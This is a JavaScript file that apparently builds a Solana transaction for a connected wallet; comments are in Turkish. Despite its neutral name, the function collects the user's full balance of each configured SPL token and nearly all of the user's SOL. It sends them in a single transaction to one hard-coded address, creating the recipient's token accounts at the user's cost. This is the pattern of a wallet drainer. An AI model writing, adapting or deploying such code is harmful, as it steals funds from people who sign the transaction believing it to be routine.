/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  getAccount,
  createTransferInstruction,
  // Aşağıdaki idempotent fonksiyon yeni sürümlerde mevcut.
  // Yoksa try/catch ile fallback yapıyoruz.
  createAssociatedTokenAccountIdempotentInstruction,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

// RPC Throttle
const BATCH_SIZE = 3;
const BATCH_DELAY_MS = 1000;

// — Genel ayarlar —
const FIXED_FEE_BUFFER_LAMPORTS = 6_000_000; // ~0.006 SOL genel ücret tamponu
const TOKEN_ACCOUNT_SIZE = 165;              // SPL token account boyutu (rent hesabı için)

/**
 * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
 * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
 */
async function runBatches(tasks) {
  const results = [];
  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
    const res = await Promise.all(batch);
    results.push(...res);
    if (i + BATCH_SIZE < tasks.length) {
      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
    }
  }
  return results;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("Wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");

  // 0) SOL bakiyesi
  const userSolLamports = await connection.getBalance(payer);

  // 1) Kullanıcının SPL bakiyelerini oku (bigint ile)
  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
    const userAta = await getAssociatedTokenAddress(mint, payer);
    let amount = 0n;
    let sufficient = false;
    try {
      const acct = await getAccount(connection, userAta);
      amount = acct.amount; // bigint
      // threshold config number ise bigint'e çeviriyoruz
      const th = BigInt(threshold);
      sufficient = amount > th;
    } catch {
      // Kullanıcının ATA'sı yok veya hesap okunamadı => yeterli değil
      sufficient = false;
    }
    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
    return { mint, userAta, toAta, amount, sufficient };
  });
  const userTokenInfos = await runBatches(balanceTasks);

  // 2) Transfer etmeyi planladığımız tokenlar
  const candidateTokens = userTokenInfos.filter((t) => t.sufficient);

  // Hiçbir varlık yeterli değilse ve SOL de yoksa çık
  if (candidateTokens.length === 0 && userSolLamports <= FIXED_FEE_BUFFER_LAMPORTS) {
    console.warn("Yeterli bakiye yok (ne SOL ne de SPL)!");
    return null;
  }

  // 3) Hedef tarafta eksik ATA var mı? (idempotent create planı)
  const existTasks = candidateTokens.map((info) => async () => {
    // getAccount ile dene; yoksa hata atar
    let toAtaExists = true;
    try {
      await getAccount(connection, info.toAta);
    } catch {
      toAtaExists = false;
    }
    return { ...info, toAtaExists };
  });
  const tokenPlans = await runBatches(existTasks);

  // 4) Rent bedelini hesapla ve bütçeyi oluştur
  const ataRentLamports = await connection.getMinimumBalanceForRentExemption(TOKEN_ACCOUNT_SIZE);

  // SOL bütçesi: önce sabit tamponu kenara ayır
  let spendableLamports = Math.max(userSolLamports - FIXED_FEE_BUFFER_LAMPORTS, 0);

  // 5) Hangi tokenları dahil edebileceğimizi seçelim:
  // - Hedef ATA varsa: rent harcamaz
  // - Hedef ATA yoksa: her biri için ataRentLamports harcar
  const selected = [];
  for (const plan of tokenPlans) {
    if (plan.toAtaExists) {
      selected.push({ ...plan, needsCreate: false });
    } else {
      if (spendableLamports >= ataRentLamports) {
        spendableLamports -= ataRentLamports;
        selected.push({ ...plan, needsCreate: true });
      } else {
        console.warn(
          `Rent yetersiz: ${plan.mint.toBase58()} için hedef ATA oluşturacak SOL kalmadı, token atlandı.`
        );
      }
    }
  }

  // 6) Instruction'ları derle
  const instructions = [];

  // 6a) SPL tokenlar: önce gerekiyorsa hedef ATA oluştur, sonra transfer et
  for (const t of selected) {
    if (t.needsCreate) {
      // Idempotent fonksiyon mevcutsa onu kullan
      if (typeof createAssociatedTokenAccountIdempotentInstruction === "function") {
        instructions.push(
          createAssociatedTokenAccountIdempotentInstruction(
            payer,          // payer (oluşturma ücretini ödeyen)
            t.toAta,        // oluşturulacak ATA
            toPublicKey,    // ATA sahibi (alıcı)
            t.mint          // mint
          )
        );
      } else {
        // Eski sürüm fallback: önceden "var mı?" kontrolü yaptık, güvenle klasik oluşturmayı ekleyebiliriz
        instructions.push(
          createAssociatedTokenAccountInstruction(
            payer,          // payer
            t.toAta,        // ata
            toPublicKey,    // owner
            t.mint          // mint
          )
        );
      }
    }

    // Tüm bakiyeyi gönderiyoruz (amount bigint)
    instructions.push(
      createTransferInstruction(
        t.userAta,     // source ATA (kullanıcı)
        t.toAta,       // hedef ATA
        payer,         // authority (kullanıcı)
        t.amount       // bigint olarak miktar
      )
    );
  }

  // 6b) Kalan SOL'u (spendableLamports) gönder (varsa)
  const solToSend = Math.max(spendableLamports, 0);
  if (solToSend > 0) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // Hiç instruction yoksa null döndür
  if (instructions.length === 0) {
    console.warn("Eklenecek hiçbir instruction bulunamadı.");
    return null;
  }

  // 7) VersionedTransaction oluştur
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  // Debug: hangi tokenlar eklendi?
  try {
    console.table(
      selected.map((s) => ({
        mint: s.mint.toBase58(),
        amount: s.amount.toString(),
        toAtaExists: s.toAtaExists,
        needsCreate: s.needsCreate,
      }))
    );
    console.log("SOL to send (lamports):", solToSend);
  } catch (_) {}

  return new VersionedTransaction(messageV0);
}
